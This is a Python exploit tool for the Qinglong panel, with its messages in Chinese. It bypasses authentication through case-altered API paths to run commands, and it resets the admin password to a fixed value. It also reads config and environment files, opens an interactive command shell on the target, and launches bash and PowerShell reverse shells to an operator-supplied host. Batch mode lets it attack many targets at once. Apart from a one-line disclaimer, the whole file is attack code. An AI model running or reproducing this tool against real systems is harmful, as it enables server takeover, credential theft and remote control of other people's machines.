import requests
import json
import sys
import time
import argparse
import os
from datetime import datetime
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple

try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
    HAS_COLOR = True
except ImportError:
    HAS_COLOR = False
    class Fore:  # type: ignore
        RED = GREEN = YELLOW = CYAN = WHITE = ''
    class Style:  # type: ignore
        BRIGHT = RESET_ALL = ''
    class Back:  # type: ignore
        BLACK = ''

def print_banner():
    print(f"{Fore.RED}Qinglong RCE Scanner{Style.RESET_ALL}")

class QinglongRCEExploit:
    def __init__(self, target_url, timeout=10, verbose=False, proxy=None, retries=3):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.verbose = verbose
        self.retries = retries
        self.session = requests.Session()
        
        headers = {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 10.0; en-US)'}
        self.session.headers.update(headers)
        
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        
        self.results = {
            'target': self.target_url,
            'is_qinglong': False,
            'version': 'unknown',
            'vulnerable': False,
            'vulnerabilities': [],
            'details': {}
        }
    
    def log(self, msg: str, level: str = "INFO"):
        prefixes = {"INFO": f"{Fore.CYAN}[*]", "SUCCESS": f"{Fore.GREEN}[+]", 
                   "WARNING": f"{Fore.YELLOW}[!]", "ERROR": f"{Fore.RED}[-]"}
        if self.verbose or level != "INFO":
            print(f"{prefixes.get(level, '[*]')}{Style.RESET_ALL} {msg}")
    def _request(self, method: str, path: str, **kwargs) -> Optional[requests.Response]:
        """统一请求方法（带重试和超时处理）"""
        url = f"{self.target_url}{path}"
        for attempt in range(self.retries):
            try:
                response = self.session.request(method, url, timeout=self.timeout, **kwargs)
                return response
            except requests.exceptions.RequestException as e:
                if attempt == self.retries - 1:
                    self.log(f"请求失败: {path} - {e}", "ERROR")
                    return None
        return None
    
    def check_alive(self) -> bool:
        resp = self._request('GET', '/api/health')
        if resp and resp.status_code == 200:
            self.results['is_qinglong'] = True
            self.log(f"目标存活 ✓", "SUCCESS")
            return True
        return False
    
    def get_version(self) -> Optional[str]:
        resp = self._request('GET', '/api/system')
        try:
            if resp and resp.status_code == 200:
                version = resp.json().get('data', {}).get('version', 'unknown')
                self.results['version'] = version
                self.log(f"版本: {version}", "INFO")
                
                if self._is_vulnerable_version(version):
                    self.results['vulnerable'] = True
                    self.results['vulnerabilities'].append('affected_version')
                    self.log(f"该版本存在已知漏洞!", "WARNING")
                return version
        except:
            pass
        return None
    
    @staticmethod
    def _is_vulnerable_version(version: str) -> bool:
        try:
            parts = version.split('.')
            if len(parts) >= 2 and parts[0] == '2':
                minor = int(parts[1])
                if minor < 20:
                    return True
                elif minor == 20:
                    patch = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 0
                    return patch <= 1
        except:
            pass
        return False
    def test_auth_bypass(self) -> bool:
        payloads = [
            ('/aPi/system/command-run', 'PUT'),
            ('/API/system/command-run', 'PUT'),
            ('/ApI/system/command-run', 'PUT'),
            ('/api/system/command-run', 'PUT'),
        ]
        
        test_data = {'command': 'whoami'}
        headers = {'Content-Type': 'application/json'}
        
        for path, method in payloads:
            try:
                resp = self._request(method, path, json=test_data, headers=headers)
                if resp and resp.status_code == 200:
                    self.log(f"鉴权绕过成功: {path}", "SUCCESS")
                    self.results['vulnerable'] = True
                    self.results['vulnerabilities'].append('auth_bypass')
                    self.results['details']['bypass_path'] = path
                    return True
            except:
                pass
        return False
    def test_password_reset(self) -> bool:
        path = '/open/user/init'
        data = {"username": "admin", "password": "H4cker@123"}
        headers = {'Content-Type': 'application/json'}
        
        resp = self._request('PUT', path, json=data, headers=headers)
        if resp and resp.status_code == 200:
            try:
                resp_data = resp.json()
                if resp_data.get('code') == 200:
                    self.log(f"密码重置成功!", "SUCCESS")
                    self.results['vulnerable'] = True
                    self.results['vulnerabilities'].append('password_reset')
                    return True
            except:
                pass
        return False
    def test_config_read(self) -> bool:
        config_paths = [
            '/aPi/configs/detail?path=config.sh',
            '/api/configs/detail?path=config.sh',
            '/aPi/system/env',
            '/api/system/env',
            '/aPi/configs/list',
            '/api/configs/list'
        ]
        
        found_configs = {}
        
        for path in config_paths:
            resp = self._request('GET', path)
            
            if resp and resp.status_code == 200:
                try:
                    resp_json = resp.json()
                    if resp_json.get('code') == 200:
                        config_content = resp_json.get('data', '')
                        if config_content:
                            self.log(f"配置泄露!", "SUCCESS")
                            self.results['vulnerable'] = True
                            self.results['vulnerabilities'].append('config_leak')
                            found_configs[path] = config_content
                except:
                    pass
        
        if found_configs:
            self.results['details']['all_configs'] = found_configs
            first_path = list(found_configs.keys())[0]
            self.results['details']['config_content'] = found_configs[first_path]
            self.results['details']['config_path'] = first_path
            self.results['details']['config_count'] = len(found_configs)
            return True
        
        return False
    def execute_command(self, command: str, check_vuln: bool = True) -> Optional[str]:
        if check_vuln and not self.results['vulnerable']:
            return None
        try:
            data = {'command': command}
            headers = {'Content-Type': 'application/json'}
            resp = self._request('PUT', '/aPi/system/command-run', json=data, headers=headers)
            return resp.text if resp and resp.status_code == 200 else None
        except Exception as e:
            self.log(f"命令执行异常: {e}", "ERROR")
            return None

    def detect_system_info(self) -> Dict:
        system_info = {
            'os': 'unknown',
            'permission': 'unknown',
            'hostname': 'unknown',
            'user': 'unknown',
            'path': 'unknown'
        }
        
        os_detect_cmd = 'cmd /c ver 2>nul || uname -s 2>/dev/null || echo unknown'
        result = self.execute_command(os_detect_cmd)
        if result:
            if 'Windows' in result or 'Microsoft' in result:
                system_info['os'] = 'Windows'
            elif 'Linux' in result:
                system_info['os'] = 'Linux'
            elif 'Darwin' in result:
                system_info['os'] = 'macOS'
        
        if system_info['os'] == 'Windows':
            user_cmd = 'whoami'
        else:
            user_cmd = 'whoami && id'
        
        result = self.execute_command(user_cmd)
        if result:
            system_info['user'] = result.strip()
            if 'root' in result.lower() or 'administrator' in result.lower():
                system_info['permission'] = '管理员/Root'
            else:
                system_info['permission'] = '普通用户'
        
        if system_info['os'] == 'Windows':
            hostname_cmd = 'hostname'
        else:
            hostname_cmd = 'hostname'
        
        result = self.execute_command(hostname_cmd)
        if result:
            system_info['hostname'] = result.strip()
        
        return system_info
    
    def show_vulnerability_menu(self) -> Optional[str]:
        vulns = self.results['vulnerabilities']
        if not vulns:
            return None
        
        print(f"\n{Fore.YELLOW}[检测到以下漏洞]{Style.RESET_ALL}")
        vuln_map = {
            'affected_version': '受影响版本',
            'auth_bypass': '鉴权绕过 (RCE)',
            'password_reset': '密码重置',
            'config_leak': '配置泄露'
        }
        
        for i, v in enumerate(vulns, 1):
            print(f"  {Fore.GREEN}{i}{Style.RESET_ALL}. {vuln_map.get(v, v)}")
        print(f"  {Fore.RED}0{Style.RESET_ALL}. 退出\n")
        
        while True:
            try:
                sys.stdout.flush()
                choice = input(f"{Fore.YELLOW}请选择 (0-{len(vulns)}): {Style.RESET_ALL}").strip()
                sys.stdout.flush()
                choice_num = int(choice)
                
                if choice_num == 0 or not (1 <= choice_num <= len(vulns)):
                    return None
                return vulns[choice_num - 1]
            except (ValueError, KeyboardInterrupt):
                return None
    
    def exploit_auth_bypass(self):
        print(f"{Fore.YELLOW}[*] 探测系统信息...{Style.RESET_ALL}")
        info = self.detect_system_info()
        
        print(f"{Fore.GREEN}[+] 系统信息:{Style.RESET_ALL}")
        print(f"    ├─ 系统: {info['os']}")
        print(f"    ├─ 用户: {info['user']}")
        print(f"    └─ 权限: {info['permission']}\n")
        
        self.display_rce_menu()
    
    def exploit_password_reset(self):
        print(f"{Fore.GREEN}[+] 默认密码已重置为: H4cker@123{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] 用户名: admin | 密码: H4cker@123\n{Style.RESET_ALL}")
    
    def exploit_config_leak(self):
        print(f"{Fore.GREEN}[+] 配置泄露内容{Style.RESET_ALL}\n")
        
        all_configs = self.results['details'].get('all_configs', {})
        config_count = self.results['details'].get('config_count', 0)
        
        if not all_configs:
            print(f"{Fore.YELLOW}[☆] 未读取到配置信息{Style.RESET_ALL}\n")
            return
        
        if config_count == 1:
            config_path = list(all_configs.keys())[0]
            config_content = all_configs[config_path]
            print(f"{Fore.CYAN}[配置路由]: {config_path}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
            print(config_content)
            print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}\n")
        else:
            print(f"{Fore.YELLOW}[发现 {config_count} 个配置文件]{Style.RESET_ALL}\n")
            for i, (path, content) in enumerate(all_configs.items(), 1):
                print(f"{Fore.GREEN}[{i}] {path}{Style.RESET_ALL}")
            
            print(f"{Fore.YELLOW}[0] 查看所有{Style.RESET_ALL}\n")
            
            while True:
                try:
                    sys.stdout.flush()
                    choice = input(f"{Fore.YELLOW}请选择要查看的配置文件 (0-{config_count}): {Style.RESET_ALL}").strip()
                    sys.stdout.flush()
                    
                    choice_num = int(choice)
                    if choice_num == 0:
                        for path, content in all_configs.items():
                            print(f"\n{Fore.CYAN}[配置路由]: {path}{Style.RESET_ALL}")
                            print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
                            print(content)
                            print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
                        break
                    elif 1 <= choice_num <= config_count:
                        path = list(all_configs.keys())[choice_num - 1]
                        content = all_configs[path]
                        print(f"\n{Fore.CYAN}[配置路由]: {path}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
                        print(content)
                        print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}\n")
                        break
                    else:
                        print(f"{Fore.RED}[!] 无效选择，请重试{Style.RESET_ALL}")
                except (ValueError, KeyboardInterrupt, IndexError):
                    break
    
    def execute_custom_command(self) -> None:
        print(f"{Fore.YELLOW}[提示] 输入 'exit' 退出{Style.RESET_ALL}\n")
        
        while True:
            try:
                sys.stdout.flush()
                cmd = input(f"{Fore.GREEN}RCE> {Style.RESET_ALL}").strip()
                sys.stdout.flush()
                
                if not cmd:
                    continue
                
                if cmd.lower() in ['exit', 'quit', 'q']:
                    print(f"{Fore.YELLOW}[*] 已退出{Style.RESET_ALL}")
                    break
                
                result = self.execute_command(cmd)
                print(f"\n{result}\n" if result else f"{Fore.RED}[!] 执行失败{Style.RESET_ALL}\n")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] 已退出{Style.RESET_ALL}")
                break
    
    def display_rce_menu(self) -> None:
        print(f"{Fore.GREEN}[+] 发现可用RCE漏洞{Style.RESET_ALL}")
        
        handlers = {
            '1': ('交互式RCE执行', self.execute_custom_command),
            '2': ('反弹Shell (bash)', self.reverse_shell_bash),
            '3': ('反弹Shell (powershell)', self.reverse_shell_powershell),
            '4': ('自定义命令执行', self.custom_reverse_shell),
        }
        
        for key, (desc, _) in handlers.items():
            print(f"{Fore.YELLOW}[{key}] {desc}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[0] 跳过{Style.RESET_ALL}\n")
        
        while True:
            try:
                sys.stdout.flush()
                choice = input(f"{Fore.YELLOW}请选择 (0-4): {Style.RESET_ALL}").strip()
                sys.stdout.flush()
                
                if choice == '0':
                    return
                elif choice in handlers:
                    handlers[choice][1]()
                    return
                else:
                    print(f"{Fore.RED}[!] 无效选择，请重试{Style.RESET_ALL}")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] 已跳过{Style.RESET_ALL}")
                return
    
    def reverse_shell_bash(self) -> None:
        print(f"\n{Fore.YELLOW}[*] Bash反弹Shell配置{Style.RESET_ALL}")
        sys.stdout.flush()
        lhost = input(f"{Fore.YELLOW}请输入您的IP地址: {Style.RESET_ALL}").strip()
        if not lhost:
            print(f"{Fore.RED}[!] 输入必填{Style.RESET_ALL}")
            return
        sys.stdout.flush()
        lport = input(f"{Fore.YELLOW}请输入您的监听端口 (默认4444): {Style.RESET_ALL}").strip() or "4444"
        sys.stdout.flush()
        
        bash_payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        print(f"\n{Fore.CYAN}[*] 监听命令:{Style.RESET_ALL} {Fore.GREEN}nc -lvnp {lport}{Style.RESET_ALL}\n")
        
        result = self.execute_command(bash_payload)
        if result:
            print(f"{Fore.GREEN}[+] 命令已发送{Style.RESET_ALL}\n")
        else:
            print(f"{Fore.RED}[!] 发送失败{Style.RESET_ALL}\n")
    
    def reverse_shell_powershell(self) -> None:
        print(f"\n{Fore.YELLOW}[*] PowerShell反弹Shell配置{Style.RESET_ALL}")
        sys.stdout.flush()
        lhost = input(f"{Fore.YELLOW}请输入您的IP地址: {Style.RESET_ALL}").strip()
        if not lhost:
            print(f"{Fore.RED}[!] 输入必填{Style.RESET_ALL}")
            return
        sys.stdout.flush()
        lport = input(f"{Fore.YELLOW}请输入您的监听端口 (默认4444): {Style.RESET_ALL}").strip() or "4444"
        sys.stdout.flush()
        
        ps_payload = f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+$(pwd).Path+'> ';$se=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($se,0,$se.Length);$s.Flush()}};$c.Close()"
        
        print(f"\n{Fore.CYAN}[*] 监听命令:{Style.RESET_ALL} {Fore.GREEN}nc -lvnp {lport}{Style.RESET_ALL}\n")
        
        cmd = f"powershell.exe -NoProfile -Command \"{ps_payload}\""
        result = self.execute_command(cmd)
        if result:
            print(f"{Fore.GREEN}[+] 命令已发送{Style.RESET_ALL}\n")
        else:
            print(f"{Fore.RED}[!] 发送失败{Style.RESET_ALL}\n")
    
    def custom_reverse_shell(self) -> None:
        print(f"\n{Fore.YELLOW}[*] 自定义命令执行{Style.RESET_ALL}")
        sys.stdout.flush()
        
        cmd = input(f"{Fore.GREEN}Command> {Style.RESET_ALL}").strip()
        sys.stdout.flush()
        
        if not cmd:
            print(f"{Fore.RED}[!] 命令不能为空{Style.RESET_ALL}")
            return
        
        result = self.execute_command(cmd)
        print(f"\n{result}\n" if result else f"{Fore.RED}[!] 执行失败{Style.RESET_ALL}\n")

    def scan(self) -> Dict:
        self.log(f"正在扫描: {self.target_url}")
        self.check_alive()
        self.get_version()
        
        tests = [self.test_auth_bypass, self.test_password_reset, 
                 self.test_config_read]
        with ThreadPoolExecutor(max_workers=4) as executor:
            list(executor.map(lambda x: x(), tests))
        
        self._print_report()
        return self.results
    
    def interactive_exploit(self):
        vuln_choice = self.show_vulnerability_menu()
        if not vuln_choice:
            return
        
        handlers = {
            'auth_bypass': self.exploit_auth_bypass,
            'password_reset': self.exploit_password_reset,
            'config_leak': self.exploit_config_leak,
            'affected_version': lambda: print(f"\n{Fore.YELLOW}该版本存在多个已知漏洞，建议立即升级{Style.RESET_ALL}\n")
        }
        
        if handler := handlers.get(vuln_choice):
            handler()
    
    def _print_report(self):
        vuln_count = len(self.results['vulnerabilities'])
        status_mark = f"{Fore.RED}[VULNERABLE]" if self.results['vulnerable'] else f"{Fore.GREEN}[SAFE]"
        
        print(f"\n{status_mark}{Style.RESET_ALL}")
        print(f"├─ {self.results['target']}")
        print(f"├─ v{self.results['version']}")
        print(f"├─ {vuln_count} 个漏洞")
        if self.results['vulnerable']:
            print(f"└─ {', '.join(self.results['vulnerabilities'])}\n")
    
    def format_result_text(self) -> str:
        status = "VULNERABLE" if self.results['vulnerable'] else "SAFE"
        vuln_count = len(self.results['vulnerabilities'])
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        text = f"""
扫描时间: {timestamp}
目标地址: {self.results['target']}
系统状态: {status}
系统版本: {self.results['version']}
漏洞数量: {vuln_count}
"""
        if self.results['vulnerable']:
            text += f"漏洞类型: {', '.join(self.results['vulnerabilities'])}\n"
        
        if self.results['details']:
            text += f"\n详细信息:\n"
            for key, value in self.results['details'].items():
                text += f"  {key}: {value}\n"
        
        return text

    @staticmethod
    def is_valid_url(url: str) -> bool:
        url = url.strip()
        if not url:
            return False
        if not (url.startswith('http://') or url.startswith('https://')):
            return False
        if ' ' in url or '\n' in url or '\t' in url:
            return False
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(
        description='Qinglong RCE Scanner v2.0',
        epilog='用法: python script.py -u <url> [-c cmd] [-v] [-t timeout] [-p proxy]',
        add_help=False
    )
    
    parser.add_argument('-u', '--url', help='目标URL')
    parser.add_argument('-f', '--file', help='批量扫描文件')
    parser.add_argument('-c', '--cmd', help='执行命令')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='超时(秒)')
    parser.add_argument('-p', '--proxy', help='代理')
    parser.add_argument('-v', '--verbose', action='store_true', help='详细模式')
    parser.add_argument('-j', '--threads', type=int, default=5, help='线程数')
    parser.add_argument('-h', '--help', action='store_true', help='帮助')
    
    args = parser.parse_args()
    
    if args.help or (not args.url and not args.file):
        print(f"""
  单个扫描: python scanner.py -u https://target:5700
  直接执行: python scanner.py -u https://target:5700 -c "id"
  批量扫描: python scanner.py -f targets.txt -j 10
  使用代理: python scanner.py -u https://target:5700 -p socks5://127.0.0.1:1080
  """)
    sys.exit(0)
    
    if args.url:
        scanner = QinglongRCEExploit(args.url, args.timeout, args.verbose, args.proxy)
        scanner.scan()
        
        if args.cmd:
            result = scanner.execute_command(args.cmd, check_vuln=False)
            if result:
                print(f"\n{Fore.GREEN}[+] 执行结果:{Style.RESET_ALL}\n{result}")
            else:
                print(f"\n{Fore.RED}[!] 执行失败{Style.RESET_ALL}")
        elif scanner.results['vulnerable']:
            try:
                scanner.interactive_exploit()
            except Exception as e:
                print(f"{Fore.RED}[!] 错误: {e}{Style.RESET_ALL}")
    
    elif args.file:
        try:
            with open(args.file, encoding='utf-8', errors='ignore') as f:
                all_lines = [line.strip() for line in f if line.strip()]
            
            valid_targets = []
            invalid_lines = []
            
            for line in all_lines:
                if QinglongRCEExploit.is_valid_url(line):
                    valid_targets.append(line)
                else:
                    invalid_lines.append(line)
            
            if not valid_targets:
                print(f"\n{Fore.RED}[-] 错误: 文件中没有找到有效的URL{Style.RESET_ALL}")
                if invalid_lines:
                    print(f"{Fore.YELLOW}[!] 发现 {len(invalid_lines)} 行非URL内容:{Style.RESET_ALL}")
                    for line in invalid_lines[:5]:
                        print(f"    - {line[:80]}")
                    if len(invalid_lines) > 5:
                        print(f"    ... 还有 {len(invalid_lines) - 5} 行")
                sys.exit(1)
            
            print(f"\n{Fore.CYAN}[*] 文件处理:{Style.RESET_ALL}")
            print(f"    ├─ 总行: {len(all_lines)}")
            print(f"    ├─ 有效: {len(valid_targets)}")
            print(f"    └─ 无效: {len(invalid_lines)}\n")
            
            print(f"{Fore.YELLOW}[*] 批量扫描 {len(valid_targets)} 个目标...{Style.RESET_ALL}\n")
            
            plant_shell = False
            sys.stdout.flush()
            shell_choice = input(f"{Fore.YELLOW}[?] 是否对发现RCE的目标进行远程代码执行? (y/n): {Style.RESET_ALL}").strip().lower()
            sys.stdout.flush()
            if shell_choice in ['y', 'yes']:
                plant_shell = True
            
            results = []
            
            with ThreadPoolExecutor(max_workers=args.threads) as executor:
                futures = {}
                scanners = {}
                
                for url in valid_targets:
                    scanner = QinglongRCEExploit(url, args.timeout, False, args.proxy)
                    future = executor.submit(scanner.scan)
                    futures[future] = url
                    scanners[url] = scanner
                
                for future in as_completed(futures):
                    url = futures[future]
                    scanner = scanners[url]
                    try:
                        result = future.result()
                        results.append((result, scanner))
                        status = f"{Fore.RED}[漏洞]" if result['vulnerable'] else f"{Fore.GREEN}[安全]"
                        print(f"{status}{Style.RESET_ALL} {url}")
                        
                        if plant_shell and result['vulnerable']:
                            if 'auth_bypass' in result['vulnerabilities']:
                                print(f"{Fore.YELLOW}  [*] 发现可用RCE，询问用户...{Style.RESET_ALL}")
                    except Exception as e:
                        print(f"{Fore.RED}[错误]{Style.RESET_ALL} {url}: {e}")
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            report_file = f"scan_report_{timestamp}.txt"
            
            vuln_count = sum(1 for r, _ in results if r['vulnerable'])
            
            with open(report_file, 'w', encoding='utf-8') as f:
                f.write(f"青龙面板漏洞扫描报告\n")
                f.write(f"生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                
                f.write(f"[统计]\n")
                f.write(f"  总计: {len(results)}\n")
                f.write(f"  漏洞: {vuln_count}\n")
                f.write(f"  安全: {len(results) - vuln_count}\n\n")
                
                f.write(f"[结果]\n")
                for result, _ in results:
                    status = "VULN" if result['vulnerable'] else "SAFE"
                    vulns = ', '.join(result['vulnerabilities']) if result['vulnerabilities'] else 'NONE'
                    f.write(f"{status} | {result['target']} | v{result['version']} | {vulns}\n")
                
                f.write(f"\n免责声明: 仅供授权渗透测试使用\n")
            
            print(f"\n{Fore.CYAN}[统计]{Style.RESET_ALL} 总计{len(results)}, 漏洞{vuln_count}")
            print(f"{Fore.GREEN}[+] 报告已保存: {report_file}{Style.RESET_ALL}\n")
            
        except FileNotFoundError:
            print(f"{Fore.RED}[-] 文件不存在: {args.file}{Style.RESET_ALL}")
            sys.exit(1)
        except Exception as e:
            print(f"{Fore.RED}[-] 批量扫描出错: {e}{Style.RESET_ALL}")
            sys.exit(1)

if __name__ == "__main__":

    main()
